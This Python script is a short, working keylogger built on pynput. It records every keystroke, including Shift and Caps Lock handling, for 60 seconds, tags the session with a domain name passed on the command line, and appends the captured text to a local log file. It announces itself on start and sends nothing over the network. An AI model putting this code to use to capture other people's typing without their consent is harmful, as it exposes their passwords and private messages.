from pynput.keyboard import Listener, Key
import logging
from datetime import datetime, timedelta
import threading
import sys  # To handle command-line arguments

# log file path initialization
log_file = r'\\wsl$\Ubuntu\home\bhanu_praharsha\session_keylog.txt'

# mapping special keys to readable text
special_keys = {
    "Key.space": " ",
    "Key.enter": "\n",
    "Key.tab": "\t",
    "Key.backspace": "[Backspace]",
    "Key.esc": "[Escape]",
}

# initialize variables for the current session log
current_session_log = []
start_time = None
end_time = None
shift_active = False  # tracks whether Shift is currently being held down
caps_lock_active = False  # tracks the state of Caps Lock

# function to process keys into readable text
def process_key(key):
    global shift_active, caps_lock_active
    try:
        char = key.char  # regular character keys
        if shift_active and char is not None:
            return char.upper()  # capitalize character if Shift is active
        if caps_lock_active and char is not None:
            return char.upper() if char.islower() else char.lower()  # change case for capslock
        return char
    except AttributeError:
        # handle special keys
        key_str = str(key)
        if key_str == "Key.shift" or key_str == "Key.shift_r" or key_str == "Key.shift_l":
            shift_active = True
            return None  # to not log shift directly
        elif key_str == "Key.caps_lock":
            caps_lock_active = not caps_lock_active  # change capslock state
            return None  # to not log capslock directly
        elif key_str in special_keys:
            return special_keys[key_str]
        return f"[{key_str}]"

def on_press(key):
    global current_session_log
    readable_key = process_key(key)
    if readable_key is not None:
        current_session_log.append(readable_key)  # append readable key to the session log

def on_release(key):
    global shift_active
    if key == Key.shift or key == Key.shift_r or key == Key.shift_l:
        shift_active = False  # reset Shift state when the key is released

def stop_listener(listener, domain):
    listener.stop()
    # log the session details into the file
    with open(log_file, "a") as file:
        # log the domain, start and end timestamps, and the captured text
        end_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        file.write(f"\nSession Start: {start_time}\n")
        file.write(f"Domain: {domain}\n")
        file.write(f"Session End: {end_time}\n")
        file.write(f"Captured Text: {''.join(current_session_log)}\n")
    print(f"Session ended for domain {domain}. Log saved to {log_file}")

if __name__ == "__main__":
    try:
        # Get domain name from command-line argument
        if len(sys.argv) != 2:
            print("Usage: python3 action.py <domain_name>")
            sys.exit(1)

        domain = sys.argv[1]
        
        # start logging
        start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_file, "a") as file:
            # log the start timestamp
            file.write(f"Session Start: {start_time}\n")
        
        print(f"Key logging started for domain {domain}. Log file: {log_file}")

        # start the listener
        with Listener(on_press=on_press, on_release=on_release) as listener:
            # set a timer to stop the listener after 1 minute
            timer = threading.Timer(60, stop_listener, [listener, domain])
            timer.start()
            listener.join()

    except Exception as e:
        print(f"An error occurred: {e}")
